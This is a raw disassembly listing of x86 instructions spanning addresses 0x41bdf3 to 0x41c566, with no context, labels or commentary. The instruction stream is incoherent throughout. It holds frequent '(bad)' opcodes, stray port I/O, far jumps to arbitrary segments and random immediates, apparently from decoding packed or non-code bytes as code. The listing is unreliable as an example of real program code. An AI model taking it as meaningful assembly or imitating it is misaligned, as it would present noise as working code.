  41bdf3:	sbb    cl,BYTE PTR [ebp-0x32]
  41bdf6:	sub    DWORD PTR [edi-0x5e],ebp
  41bdf9:	and    DWORD PTR [eax+0x72678eca],eax
  41bdff:	or     esp,esp
  41be01:	push   eax
  41be02:	int3   
  41be03:	fwait
  41be04:	pop    edx
  41be05:	xchg   DWORD PTR [ebp+0x413bc4f6],eax
  41be0b:	sbb    al,0x76
  41be0d:	loopne 0x41be85
  41be0f:	push   ebp
  41be10:	or     BYTE PTR ds:[ecx+edx*4],0x93
  41be15:	ret    
  41be16:	mov    ecx,0x9a54248b
  41be1b:	rcl    ecx,1
  41be1d:	loop   0x41be7c
  41be1f:	jnp    0x41be62
  41be21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be22:	mov    al,0xb5
  41be24:	xchg   ebx,eax
  41be25:	or     ah,0x9
  41be28:	add    DWORD PTR [esi+0x0],esp
  41be2b:	call   DWORD PTR [edx+0x4a]
  41be2e:	inc    ebp
  41be2f:	jle    0x41bdb4
  41be31:	mov    edx,0xceb8ce2d
  41be36:	cmp    cl,BYTE PTR [edi]
  41be38:	and    DWORD PTR [ecx+0x6869e47],esp
  41be3e:	out    dx,eax
  41be3f:	retf   0xe2f3
  41be42:	call   0xb510:0xe1525f40
  41be49:	(bad)  
  41be4b:	sahf   
  41be4c:	out    dx,al
  41be4d:	mov    ebp,0x6e1f419e
  41be52:	jecxz  0x41be8b
  41be54:	inc    edx
  41be55:	jno    0x41be99
  41be57:	sti    
  41be58:	and    BYTE PTR [esi],cl
  41be5a:	push   ss
  41be5b:	mov    edx,0xc880281a
  41be60:	in     al,0xae
  41be62:	lods   al,BYTE PTR ds:[esi]
  41be63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be64:	dec    edi
  41be65:	loopne 0x41be9f
  41be67:	mov    ds:0xd4782158,al
  41be6c:	or     esi,ebp
  41be6e:	and    al,0xe
  41be70:	sub    esp,DWORD PTR [ebx-0x7b]
  41be73:	and    eax,0x6b79dbe1
  41be78:	push   edx
  41be79:	jno    0x41be31
  41be7b:	gs mov ah,0x8a
  41be7e:	rol    DWORD PTR [eax-0xd998cfb],0xef
  41be85:	mov    bl,0x44
  41be87:	mov    esi,0x7b02e008
  41be8c:	adc    ah,BYTE PTR [eax+0x2c]
  41be8f:	xor    BYTE PTR [ecx+0x15],0xcf
  41be93:	add    ebp,DWORD PTR ds:0xda6b9f21
  41be99:	fs push ss
  41be9b:	push   ds
  41be9c:	pop    eax
  41be9d:	enter  0xcace,0xc4
  41bea1:	stc    
  41bea2:	pop    ecx
  41bea3:	and    BYTE PTR ds:0x8f7dee33,ch
  41bea9:	sbb    edx,ebp
  41beab:	add    al,0xec
  41bead:	cwde   
  41beae:	sub    bl,dl
  41beb0:	cmc    
  41beb1:	shl    BYTE PTR [ecx+edi*2],cl
  41beb4:	cmp    al,0x73
  41beb6:	xchg   ebx,eax
  41beb7:	clc    
  41beb8:	clc    
  41beb9:	jbe    0x41bf39
  41bebb:	push   ss
  41bebc:	cli    
  41bebd:	inc    ebx
  41bebe:	leave  
  41bebf:	fisttp WORD PTR [esi+0x7a]
  41bec2:	(bad)  
  41bec3:	mov    eax,ds:0x330f4d87
  41bec8:	and    eax,0x8dc04665
  41becd:	add    BYTE PTR [ebp-0x1009f633],cl
  41bed3:	iret   
  41bed4:	add    ebx,DWORD PTR [edi]
  41bed6:	outs   dx,DWORD PTR ds:[esi]
  41bed7:	test   eax,0x2d477319
  41bedc:	in     eax,dx
  41bedd:	sub    eax,0xc090678e
  41bee2:	cmp    al,0x5
  41bee4:	sar    ecx,1
  41bee6:	push   esi
  41bee7:	and    ebp,ebp
  41bee9:	(bad)  
  41beea:	test   eax,0x5ff63f58
  41beef:	mov    dl,0xcd
  41bef1:	or     BYTE PTR [esi+0x6d5f3104],al
  41bef7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bef8:	add    BYTE PTR ds:0xeee4c50f,ch
  41befe:	push   edi
  41beff:	jmp    0x3292:0x7113d6de
  41bf06:	mov    bl,0xd8
  41bf08:	adc    eax,0x48267129
  41bf0d:	pinsrw mm1,ebx,0xcd
  41bf11:	mov    esi,0x9ade45c9
  41bf16:	daa    
  41bf17:	(bad)  
  41bf18:	cld    
  41bf19:	lahf   
  41bf1a:	xor    eax,0x7fc9d258
  41bf1f:	jmp    0x299e945a
  41bf24:	xchg   esp,eax
  41bf25:	mov    ah,0xa4
  41bf27:	(bad)  
  41bf29:	test   al,0xee
  41bf2b:	aas    
  41bf2c:	lds    ecx,FWORD PTR [ecx+ecx*1-0x75]
  41bf30:	ss push eax
  41bf32:	neg    DWORD PTR [eax-0x30]
  41bf35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf36:	and    DWORD PTR [esi+0x78192b40],esp
  41bf3c:	xchg   ecx,eax
  41bf3d:	popf   
  41bf3e:	push   esp
  41bf3f:	(bad)  
  41bf41:	cli    
  41bf42:	jo     0x41bf82
  41bf44:	push   ebx
  41bf45:	(bad)  
  41bf46:	aad    0x12
  41bf48:	push   0x6551af66
  41bf4d:	mov    ah,0x11
  41bf4f:	adc    al,0x9
  41bf51:	mov    dh,0xd
  41bf53:	xchg   ebp,eax
  41bf54:	push   0x7f
  41bf56:	imul   al
  41bf58:	add    al,0xc1
  41bf5a:	jl     0x41bf9c
  41bf5c:	aaa    
  41bf5d:	out    dx,eax
  41bf5e:	je     0x41beed
  41bf60:	and    al,0x5c
  41bf62:	mov    cl,0xfb
  41bf64:	or     BYTE PTR [eax-0x5d],al
  41bf67:	pop    ebx
  41bf68:	call   0x718fbcb2
  41bf6d:	xchg   esi,eax
  41bf6e:	inc    ebp
  41bf6f:	ja     0x41bf16
  41bf71:	jnp    0x41bf69
  41bf73:	pop    eax
  41bf74:	adc    ch,BYTE PTR [edi-0x13]
  41bf77:	lods   al,BYTE PTR ds:[esi]
  41bf78:	sti    
  41bf79:	adc    DWORD PTR [ebx],esp
  41bf7b:	scas   eax,DWORD PTR es:[edi]
  41bf7c:	pop    edi
  41bf7d:	xchg   ebp,eax
  41bf7e:	pop    edx
  41bf7f:	out    0x3d,al
  41bf81:	fldcw  WORD PTR [edi]
  41bf83:	lahf   
  41bf84:	ds cwde 
  41bf86:	pop    es
  41bf87:	or     cl,dh
  41bf89:	arpl   WORD PTR ds:[edi+0x68476e6],bp
  41bf90:	(bad)  
  41bf91:	ja     0x41bff4
  41bf93:	lea    ecx,[esi]
  41bf95:	xchg   ecx,eax
  41bf96:	ds dec esi
  41bf98:	push   esp
  41bf99:	pop    edi
  41bf9a:	inc    eax
  41bf9b:	mov    cl,0x8b
  41bf9d:	pop    esp
  41bf9e:	mov    al,ds:0x20c38ae0
  41bfa3:	int    0xae
  41bfa5:	shr    ebp,0xe8
  41bfa8:	and    esp,edi
  41bfaa:	out    0x12,al
  41bfac:	scas   eax,DWORD PTR es:[edi]
  41bfad:	xchg   esp,eax
  41bfae:	add    bh,dh
  41bfb0:	rcl    dl,1
  41bfb2:	xor    DWORD PTR [edi+0x5],esp
  41bfb5:	ss xchg edx,eax
  41bfb7:	addr16 dec ebp
  41bfb9:	cdq    
  41bfba:	jmp    0x49c4:0x12c5b246
  41bfc1:	xor    bl,BYTE PTR [ecx+0x54]
  41bfc4:	add    DWORD PTR [ebp+0x1cf800d],0x70
  41bfcb:	lea    ecx,[esi+eax*1-0x57]
  41bfcf:	sbb    ebp,DWORD PTR [ecx+0x3303fec7]
  41bfd5:	dec    ecx
  41bfd6:	sbb    DWORD PTR [esi],ebp
  41bfd8:	xchg   ebx,eax
  41bfd9:	lock mov ah,0x53
  41bfdc:	push   esp
  41bfdd:	jle    0x41bfc8
  41bfdf:	jl     0x41c026
  41bfe1:	scas   al,BYTE PTR es:[edi]
  41bfe2:	ins    DWORD PTR es:[edi],dx
  41bfe3:	sbb    BYTE PTR [esi],ch
  41bfe5:	push   edi
  41bfe6:	fs jnp 0x41c032
  41bfe9:	cs (bad) 
  41bfeb:	(bad)  
  41bfec:	shr    BYTE PTR [esi],1
  41bfee:	rol    DWORD PTR [eax],cl
  41bff0:	or     BYTE PTR [ebx-0x34],cl
  41bff3:	out    0xa2,eax
  41bff5:	(bad)  
  41bff6:	pop    edx
  41bff7:	out    dx,eax
  41bff8:	adc    ebx,DWORD PTR [ecx-0x41]
  41bffb:	retf   0x2a31
  41bffe:	(bad)  
  41c000:	add    esp,DWORD PTR [edi+0x9]
  41c003:	push   cs
  41c004:	std    
  41c005:	cmp    ah,dl
  41c007:	sub    BYTE PTR [esi],cl
  41c009:	mov    cl,0x36
  41c00b:	push   es
  41c00c:	call   0x85491685
  41c011:	adc    eax,DWORD PTR [eax+0x46]
  41c014:	repnz aad 0x13
  41c017:	lahf   
  41c018:	out    dx,al
  41c019:	inc    ebp
  41c01a:	jnp    0x41c000
  41c01c:	mov    dh,0x7
  41c01e:	sar    BYTE PTR [ecx+esi*2],1
  41c021:	imul   ebp,DWORD PTR [eax+0x3caec562],0xffffffa9
  41c028:	cli    
  41c029:	fld    TBYTE PTR [edx]
  41c02b:	in     al,0x2c
  41c02d:	dec    ebx
  41c02e:	aas    
  41c02f:	iret   
  41c030:	in     eax,0xf6
  41c032:	mov    WORD PTR [esi-0x4503e678],fs
  41c038:	push   ss
  41c039:	(bad)  
  41c03a:	cli    
  41c03b:	test   al,0xdb
  41c03d:	nop
  41c03e:	jns    0x41c057
  41c040:	clc    
  41c041:	mov    ds:0xf30c31c2,eax
  41c046:	add    BYTE PTR ds:0x87e3f902,dl
  41c04c:	jl     0x41c04a
  41c04e:	mov    bl,0x50
  41c050:	out    0xc,eax
  41c052:	xor    DWORD PTR [ebx-0x2e8fa593],esi
  41c058:	addr16 pop ss
  41c05a:	add    BYTE PTR [ebx+ebp*2],dl
  41c05d:	leave  
  41c05e:	xor    dl,BYTE PTR [ebx+0x3d]
  41c061:	mov    cl,0xdd
  41c063:	and    dh,bl
  41c065:	fmul   QWORD PTR [edi+0x20061225]
  41c06b:	add    BYTE PTR [edx+0x7a],cl
  41c06e:	repz mov ds,ecx
  41c071:	test   al,0x9c
  41c073:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c074:	or     al,BYTE PTR [ecx+edx*1-0x76baff38]
  41c07b:	and    bl,BYTE PTR [ebx-0x6f]
  41c07e:	loope  0x41c097
  41c080:	push   ebx
  41c081:	mov    bh,0x96
  41c083:	push   0xcab40a28
  41c088:	scas   al,BYTE PTR es:[edi]
  41c089:	add    BYTE PTR [edi+0x81d876b],bl
  41c08f:	out    dx,eax
  41c090:	or     ebp,0xffffffd5
  41c093:	inc    ebp
  41c094:	lods   al,BYTE PTR ds:[esi]
  41c095:	pop    eax
  41c096:	sahf   
  41c097:	add    ebx,ebx
  41c099:	mov    BYTE PTR [esi-0x1e],0x3e
  41c09d:	and    BYTE PTR [eax-0x173e214a],bh
  41c0a3:	sbb    dh,BYTE PTR [ecx+edi*1+0x202c181b]
  41c0aa:	dec    esi
  41c0ab:	loop   0x41c0c5
  41c0ad:	xchg   ebx,eax
  41c0ae:	imul   ebp,DWORD PTR [ecx-0x60],0xffffff87
  41c0b2:	in     eax,0xee
  41c0b4:	jns    0x41c062
  41c0b6:	scas   eax,DWORD PTR es:[edi]
  41c0b7:	cld    
  41c0b8:	dec    eax
  41c0b9:	push   edx
  41c0ba:	jle    0x41c08b
  41c0bc:	inc    esp
  41c0bd:	fxch   st(0)
  41c0bf:	mov    BYTE PTR [edx+0x8f5c8a5],cl
  41c0c5:	das    
  41c0c6:	jno    0x41c0ae
  41c0c8:	jl     0x41c13d
  41c0ca:	dec    ecx
  41c0cb:	and    esp,DWORD PTR [eax+eax*1]
  41c0ce:	imul   ecx,DWORD PTR [ebp+0x13],0x7e
  41c0d2:	into   
  41c0d3:	and    DWORD PTR [ebp-0x39a33eab],0x65a76849
  41c0dd:	mov    ds:0xf6a06b6a,eax
  41c0e2:	outs   dx,DWORD PTR ds:[esi]
  41c0e3:	jge    0x41c0e3
  41c0e5:	or     edi,DWORD PTR [eax+esi*8+0x647d0296]
  41c0ec:	arpl   WORD PTR [ecx-0x384db972],si
  41c0f2:	scas   al,BYTE PTR es:[edi]
  41c0f3:	mov    edi,DWORD PTR [ecx+0x6e]
  41c0f6:	loop   0x41c0e4
  41c0f8:	cmp    esp,edi
  41c0fa:	scas   al,BYTE PTR es:[edi]
  41c0fb:	arpl   WORD PTR [esi],si
  41c0fd:	add    DWORD PTR [ecx+0x4],edi
  41c100:	pop    edx
  41c101:	sbb    edx,DWORD PTR [ecx+0x2c]
  41c104:	add    esp,ecx
  41c106:	and    al,0xb7
  41c108:	inc    esi
  41c109:	das    
  41c10a:	fisubr DWORD PTR [esi+0x3fa7b445]
  41c110:	push   ebx
  41c111:	xor    dl,dh
  41c113:	cwde   
  41c114:	mov    ebp,0xb584f92e
  41c119:	lods   eax,DWORD PTR ds:[esi]
  41c11a:	jno    0x41c16e
  41c11c:	sbb    eax,0x92dc1fc6
  41c121:	jl     0x41c19f
  41c123:	mov    dl,0x9b
  41c125:	out    0x7e,eax
  41c127:	(bad)  
  41c128:	xor    eax,0xb0281bc6
  41c12d:	(bad)  
  41c12e:	addr16 cwde 
  41c130:	cmp    DWORD PTR [eax+ecx*2+0x69c5d981],0xffffffaf
  41c138:	fs jle 0x41c125
  41c13b:	fstp   TBYTE PTR [edx-0x4b]
  41c13e:	and    DWORD PTR [edi+0x4],ebp
  41c141:	inc    ecx
  41c142:	xchg   ebp,eax
  41c143:	ins    DWORD PTR es:[edi],dx
  41c144:	cmp    eax,0x1bda8777
  41c149:	das    
  41c14a:	cmp    eax,0xcbe00003
  41c14f:	mov    esi,0x20498aaa
  41c154:	addr16 or ecx,ebx
  41c157:	adc    al,0x47
  41c159:	cld    
  41c15a:	iret   
  41c15b:	cld    
  41c15c:	cmp    al,0x43
  41c15e:	and    edx,edi
  41c160:	pop    es
  41c161:	mov    ebx,0x5102e8f8
  41c166:	scas   al,BYTE PTR es:[edi]
  41c167:	mov    ebp,0xf32d1bf0
  41c16c:	jl     0x41c112
  41c16e:	pushf  
  41c16f:	sbb    BYTE PTR ds:[eax-0x44],bl
  41c173:	xor    al,0x8a
  41c175:	loopne 0x41c1a7
  41c177:	daa    
  41c178:	xor    BYTE PTR [edx+0x7943ee44],ah
  41c17e:	out    0xf1,al
  41c180:	pop    ecx
  41c181:	add    al,0x3a
  41c183:	pop    esi
  41c184:	add    dh,cl
  41c186:	outs   dx,DWORD PTR ds:[esi]
  41c187:	test   eax,0x1ea727d6
  41c18c:	addr16 pop cx
  41c18f:	mov    ah,0x1a
  41c191:	loop   0x41c11e
  41c193:	test   BYTE PTR [esi-0x11],bl
  41c196:	pop    ebp
  41c197:	jg     0x41c1a5
  41c199:	push   ebp
  41c19a:	ds dec ecx
  41c19c:	mov    dh,0x1
  41c19e:	das    
  41c19f:	mov    bl,0xb7
  41c1a1:	sub    ch,BYTE PTR [edi-0x2a]
  41c1a4:	ror    DWORD PTR [ebp-0x112aa9a5],1
  41c1aa:	mov    ds:0xdc516137,eax
  41c1af:	imul   edi,DWORD PTR [edx],0xeff6706b
  41c1b5:	jns    0x41c19c
  41c1b7:	clc    
  41c1b8:	data16 lahf 
  41c1ba:	mov    edi,0x3e42f4a3
  41c1bf:	addr16 pop ds
  41c1c1:	xchg   ebp,eax
  41c1c2:	int3   
  41c1c3:	push   ecx
  41c1c4:	pushf  
  41c1c5:	sar    BYTE PTR [ebx-0x7d09ec6f],1
  41c1cb:	push   ebp
  41c1cc:	out    0x8,eax
  41c1ce:	jmp    0x2a5:0xe315c4cd
  41c1d5:	mov    bh,0x62
  41c1d7:	mov    al,0x91
  41c1d9:	shl    BYTE PTR [ecx],1
  41c1db:	inc    ecx
  41c1dc:	fwait
  41c1dd:	mov    esi,0x17bf8eb7
  41c1e2:	(bad)  
  41c1e3:	pop    edx
  41c1e4:	call   0x8457:0x50db83e
  41c1eb:	mov    al,0x5e
  41c1ed:	xchg   ecx,eax
  41c1ee:	fisub  DWORD PTR [ebp-0x2495f2b3]
  41c1f4:	adc    ch,BYTE PTR [ecx-0x8c0c29c]
  41c1fa:	adc    eax,DWORD PTR [ecx]
  41c1fc:	adc    bl,BYTE PTR [ebx-0x313e3b3c]
  41c202:	pop    ds
  41c203:	imul   ebx,DWORD PTR [ecx+0x3c35bd1c],0xfa758559
  41c20d:	out    dx,eax
  41c20e:	mov    ecx,0x298e286
  41c213:	mov    esp,0x2dac7058
  41c218:	dec    ebx
  41c219:	call   0xaf7e38fe
  41c21e:	adc    al,0x30
  41c220:	mov    eax,0x7eb785c4
  41c225:	daa    
  41c226:	shl    BYTE PTR [esp+ebp*4+0x9],0x65
  41c22b:	adc    cl,BYTE PTR [edx+0x74]
  41c22e:	mov    ebp,0x31cf17c7
  41c233:	sar    DWORD PTR [ebp+0x6bd0e248],0x59
  41c23a:	into   
  41c23b:	rol    BYTE PTR [edx+0x42fb397d],1
  41c241:	xor    ecx,DWORD PTR [ebx-0x4d]
  41c244:	adc    esp,DWORD PTR [ecx]
  41c246:	daa    
  41c247:	sub    eax,0xa6c2000c
  41c24c:	fwait
  41c24d:	mov    esi,0xe06005ad
  41c252:	or     al,0xed
  41c254:	push   ebp
  41c255:	push   0xf5dd6eae
  41c25a:	mov    dl,0x2a
  41c25c:	xor    eax,0xa04fca43
  41c261:	test   al,0x35
  41c263:	sbb    eax,0x67626504
  41c268:	push   ebp
  41c269:	pop    ecx
  41c26a:	adc    BYTE PTR [ebx],cl
  41c26c:	lock or ah,ch
  41c26f:	mov    DWORD PTR [ecx+0x5cdd7454],ebp
  41c275:	push   edi
  41c276:	jb     0x41c259
  41c278:	cld    
  41c279:	inc    ebp
  41c27a:	xor    DWORD PTR [eax],edx
  41c27c:	aas    
  41c27d:	lods   al,BYTE PTR ds:[esi]
  41c27e:	add    DWORD PTR [esp+ecx*8-0x2a],edi
  41c282:	add    dl,al
  41c284:	ds ret 
  41c286:	push   cs
  41c287:	(bad)  
  41c288:	data16 xchg BYTE PTR gs:[edx-0x24fdabd0],bl
  41c290:	push   ss
  41c291:	jmp    0x41c21d
  41c293:	mov    ecx,0x54e094b0
  41c298:	cmp    al,0x3d
  41c29a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c29b:	inc    esp
  41c29c:	or     ebp,DWORD PTR [edx]
  41c29e:	enter  0xd76e,0x3f
  41c2a2:	add    BYTE PTR [ebp-0x39],al
  41c2a5:	call   0xff82:0xdb21f066
  41c2ac:	retf   
  41c2ad:	stos   DWORD PTR es:[edi],eax
  41c2ae:	push   ecx
  41c2af:	inc    edi
  41c2b0:	or     DWORD PTR [ecx+ecx*4-0x2d],0x9a979c4
  41c2b8:	(bad)  [edx+edi*1+0x46]
  41c2bc:	fidiv  DWORD PTR [ebp+ebx*2-0x55]
  41c2c0:	mov    edx,0x65a26351
  41c2c5:	fcmovne st,st(0)
  41c2c7:	sub    ebx,DWORD PTR [si+0xf]
  41c2cb:	add    BYTE PTR [edi+ecx*1-0x2],0x40
  41c2d0:	mov    esi,0x5ceb4d92
  41c2d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c2d6:	adc    edi,DWORD PTR [eax]
  41c2d8:	sub    al,cl
  41c2da:	jmp    0xce1b:0x946b69a4
  41c2e1:	fwait
  41c2e2:	mov    esi,esp
  41c2e4:	aad    0xf0
  41c2e6:	mov    edi,0xfc7d363a
  41c2eb:	push   ds
  41c2ec:	cmp    DWORD PTR [ebp+0x18],eax
  41c2ef:	pop    esp
  41c2f0:	sbb    DWORD PTR [ecx+0x6a],ebx
  41c2f3:	adc    al,0xa9
  41c2f5:	mov    ds:0x71f5774f,eax
  41c2fa:	(bad)
  41c2fd:	pop    esi
  41c2fe:	ins    BYTE PTR es:[edi],dx
  41c2ff:	lods   al,BYTE PTR ds:[esi]
  41c300:	push   0xffffffe9
  41c302:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c303:	cdq    
  41c304:	(bad)  
  41c305:	test   al,0xce
  41c307:	xchg   esi,eax
  41c308:	lahf   
  41c309:	daa    
  41c30a:	mov    ch,0x5a
  41c30c:	sbb    dh,BYTE PTR [eax+0x23575b32]
  41c312:	(bad)  
  41c313:	mov    ebx,DWORD PTR [eax]
  41c315:	and    eax,0x7a03e199
  41c31a:	jp     0x41c36b
  41c31c:	neg    DWORD PTR [ecx+eax*4-0x711eb499]
  41c323:	sub    dh,BYTE PTR [esi+ecx*1]
  41c326:	add    dh,BYTE PTR [edx+0x1f]
  41c329:	pop    ds
  41c32a:	js     0x41c331
  41c32c:	(bad)  
  41c32e:	or     ebx,DWORD PTR [ecx]
  41c330:	push   edx
  41c331:	iret   
  41c332:	pop    edx
  41c333:	shr    ebp,cl
  41c335:	mov    ecx,0x35acdd5e
  41c33a:	sub    esi,DWORD PTR [edx+0x4da36f6d]
  41c340:	test   BYTE PTR [edi],bl
  41c342:	in     al,dx
  41c343:	repnz mov ds:0xd1420dd7,eax
  41c349:	int3   
  41c34a:	ret    
  41c34b:	in     eax,0xad
  41c34d:	enter  0x45ab,0xec
  41c351:	jle    0x41c2d8
  41c353:	xor    DWORD PTR [ecx-0x38d7cafd],edi
  41c359:	(bad)  
  41c35a:	mov    ecx,0x3e3a55c2
  41c35f:	xchg   DWORD PTR [eax-0x16],esi
  41c362:	xor    al,BYTE PTR [edi+edx*4-0x42]
  41c366:	shl    BYTE PTR [ecx],0x8
  41c369:	fcomp  QWORD PTR [edi+0x52b3d4f]
  41c36f:	das    
  41c370:	or     BYTE PTR [ebp-0x67],ch
  41c373:	pmaddwd mm3,QWORD PTR [eax]
  41c376:	adc    BYTE PTR [ebp+ebp*1-0x28],0x77
  41c37b:	idiv   BYTE PTR [edx]
  41c37d:	mov    eax,0xdab60563
  41c382:	xlat   BYTE PTR ds:[ebx]
  41c383:	push   ds
  41c384:	jns    0x41c3fc
  41c386:	pop    ss
  41c387:	adc    DWORD PTR [ebx],0x19d7b2ec
  41c38d:	repnz jmp 0x40b1:0xc7136c57
  41c395:	xchg   edi,eax
  41c396:	(bad)  
  41c397:	loope  0x41c334
  41c399:	fistp  QWORD PTR [esi-0x3c38bd76]
  41c39f:	xchg   DWORD PTR [ebx-0x49],edx
  41c3a2:	jo     0x41c3d0
  41c3a4:	jl     0x41c38f
  41c3a6:	sar    ecx,1
  41c3a8:	out    0x86,al
  41c3aa:	jnp    0x41c39a
  41c3ac:	int    0x44
  41c3ae:	into   
  41c3af:	mov    edi,0xf90b9418
  41c3b4:	push   0x79
  41c3b6:	shl    BYTE PTR [eax],1
  41c3b8:	inc    ebx
  41c3b9:	and    bh,BYTE PTR [eax-0x4d]
  41c3bc:	fisttp WORD PTR [esi]
  41c3be:	jge    0x41c37d
  41c3c0:	cmp    al,0x19
  41c3c2:	mov    ds:0x81ac7f80,al
  41c3c7:	ins    BYTE PTR es:[edi],dx
  41c3c8:	test   al,0xf2
  41c3ca:	mov    ds:0x82f8264,al
  41c3cf:	lahf   
  41c3d0:	jp     0x41c38f
  41c3d2:	xor    al,0x6e
  41c3d4:	aam    0x68
  41c3d6:	fdivr  DWORD PTR [esi]
  41c3d8:	std    
  41c3d9:	std    
  41c3da:	or     ebx,DWORD PTR [edi+0x12]
  41c3dd:	xor    eax,0xdc351889
  41c3e2:	push   esp
  41c3e3:	jecxz  0x41c36b
  41c3e5:	dec    ecx
  41c3e6:	xor    DWORD PTR [ebx+0x6487d50f],edx
  41c3ec:	push   edx
  41c3ed:	mov    eax,0xd66e0516
  41c3f2:	(bad)  
  41c3f3:	int3   
  41c3f4:	imul   ecx,DWORD PTR [edx+ebp*8],0xc02774c1
  41c3fb:	cmp    al,0x8
  41c3fd:	sub    DWORD PTR [ecx-0x70bf7f35],ebp
  41c403:	in     al,0xc2
  41c405:	sbb    bl,ah
  41c407:	jmp    0x41c3ca
  41c409:	imul   BYTE PTR [esi-0x2a]
  41c40c:	fisub  DWORD PTR [ecx]
  41c40e:	mov    eax,ds:0x69d1b3af
  41c413:	pushf  
  41c414:	and    BYTE PTR [esi-0x5b],cl
  41c417:	imul   ecx,DWORD PTR [ebx],0xffffff9e
  41c41a:	clc    
  41c41b:	mov    ebx,esp
  41c41d:	outs   dx,DWORD PTR ds:[esi]
  41c41e:	fisub  DWORD PTR [ebx+0x69655d4b]
  41c424:	and    BYTE PTR [edi],ch
  41c426:	lahf   
  41c427:	jl     0x41c3f6
  41c429:	adc    edi,DWORD PTR [eax]
  41c42b:	xchg   DWORD PTR [eax+0x18],esp
  41c42e:	inc    ebp
  41c42f:	push   edx
  41c430:	test   BYTE PTR [ebp+0x29b1c685],dh
  41c436:	enter  0x4098,0xd6
  41c43a:	fwait
  41c43b:	rol    DWORD PTR [edx],0x78
  41c43e:	retf   
  41c43f:	lods   al,BYTE PTR ds:[esi]
  41c440:	out    dx,al
  41c441:	dec    ebx
  41c442:	mov    BYTE PTR [ebx+0x19],0x24
  41c446:	int    0x76
  41c448:	ret    0xf32e
  41c44b:	pop    ebp
  41c44c:	add    esi,DWORD PTR [ebp-0x9]
  41c44f:	dec    ecx
  41c450:	cmp    DWORD PTR [ebx-0x6f],edx
  41c453:	mov    ebp,0x546de98f
  41c458:	xchg   edi,eax
  41c459:	fsubp  st(7),st
  41c45b:	(bad)  [ebp-0x62]
  41c45e:	gs aad 0x5c
  41c461:	push   0xffffffb9
  41c463:	xchg   ebx,esi
  41c465:	ins    BYTE PTR es:[edi],dx
  41c466:	icebp  
  41c467:	imul   edi,edx,0x7c
  41c46a:	xor    al,0xa6
  41c46c:	adc    bl,BYTE PTR ds:0xfe48ce90
  41c472:	aas    
  41c473:	xor    DWORD PTR [eax-0x14a70a5f],esi
  41c479:	pusha  
  41c47a:	jbe    0x41c4e9
  41c47c:	test   ecx,edx
  41c47e:	inc    edx
  41c47f:	into   
  41c480:	push   edi
  41c481:	call   0xcabd43a5
  41c486:	sti    
  41c487:	sbb    DWORD PTR [ecx],esi
  41c489:	popa   
  41c48a:	pusha  
  41c48b:	jno    0x41c4ff
  41c48d:	jbe    0x41c4d0
  41c48f:	in     eax,0x29
  41c491:	add    eax,edi
  41c493:	mov    esi,0x15016f01
  41c498:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c499:	loop   0x41c47a
  41c49b:	xor    eax,0xe1c38023
  41c4a0:	pop    ds
  41c4a1:	mov    edx,0x3705e043
  41c4a6:	sahf   
  41c4a7:	pop    edi
  41c4a8:	xchg   esp,eax
  41c4a9:	jge    0x41c4c8
  41c4ab:	cli    
  41c4ac:	jmp    0x802491d5
  41c4b1:	ret    
  41c4b2:	add    al,BYTE PTR [esi-0x7d]
  41c4b5:	inc    ebp
  41c4b6:	xchg   esp,eax
  41c4b7:	mov    BYTE PTR [eax+esi*2-0x7f],ah
  41c4bb:	(bad)  
  41c4bc:	(bad)  
  41c4bd:	scas   eax,DWORD PTR es:[edi]
  41c4be:	jb     0x41c52e
  41c4c0:	dec    edx
  41c4c1:	sbb    al,0xbd
  41c4c3:	rol    BYTE PTR [edi],0xdc
  41c4c6:	or     eax,0x180ece6c
  41c4cb:	jns    0x41c540
  41c4cd:	push   ebx
  41c4ce:	push   edx
  41c4cf:	xchg   edx,eax
  41c4d0:	ja     0x41c480
  41c4d2:	and    edi,DWORD PTR [ecx]
  41c4d4:	dec    ebp
  41c4d5:	and    ecx,DWORD PTR [ebx+0x2699d62c]
  41c4db:	stos   BYTE PTR es:[edi],al
  41c4dc:	and    eax,0x63229513
  41c4e1:	and    DWORD PTR [esp+ecx*4+0x24],0x6c
  41c4e6:	ja     0x41c480
  41c4e8:	out    dx,eax
  41c4e9:	jp     0x41c4ce
  41c4eb:	adc    DWORD PTR [eax],esp
  41c4ed:	jae    0x41c4d7
  41c4ef:	or     ebp,ecx
  41c4f1:	dec    ecx
  41c4f2:	mov    ch,0x7e
  41c4f4:	mov    eax,0x9502a3cd
  41c4f9:	dec    eax
  41c4fa:	outs   dx,BYTE PTR ds:[esi]
  41c4fb:	and    al,0xa3
  41c4fd:	fs cmc 
  41c4ff:	push   esp
  41c500:	mov    WORD PTR [ecx+0x43],es
  41c503:	add    BYTE PTR [esi-0x524c76b4],dh
  41c509:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c50a:	and    eax,0xdf40d411
  41c50f:	jp     0x41c518
  41c511:	in     al,dx
  41c512:	push   ebp
  41c513:	mov    esp,edx
  41c515:	xor    esp,DWORD PTR [edx-0x7]
  41c518:	jb     0x41c577
  41c51a:	push   esi
  41c51b:	xor    dl,BYTE PTR [edi+0x3d]
  41c51e:	push   ss
  41c51f:	dec    eax
  41c520:	fistp  WORD PTR [ebx+0x1aba31a2]
  41c526:	stos   BYTE PTR es:[edi],al
  41c527:	inc    ebp
  41c528:	cmp    cl,BYTE PTR [esi-0x3a6fbce8]
  41c52e:	pusha  
  41c52f:	popa   
  41c530:	pop    es
  41c531:	pushf  
  41c532:	xor    eax,0xd5509b54
  41c537:	cmp    cl,BYTE PTR [eax-0x5cad81eb]
  41c53d:	dec    ebp
  41c53e:	fmul   DWORD PTR [edi+0x5901352]
  41c544:	mov    WORD PTR [esi+edi*4-0x58],ss
  41c548:	or     al,0x6d
  41c54a:	cmp    BYTE PTR [ebp-0x39],bl
  41c54d:	add    al,BYTE PTR [esi]
  41c54f:	push   edi
  41c550:	and    ebp,DWORD PTR [ebp-0x13]
  41c553:	adc    eax,0x6be3fa5a
  41c558:	repnz not DWORD PTR [ebp+0x52870f0b]
  41c55f:	aas    
  41c560:	dec    ebx
  41c561:	xor    DWORD PTR [ebp-0x42],ebp
  41c564:	mov    ch,0x61
  41c566:	xor    bh,cl
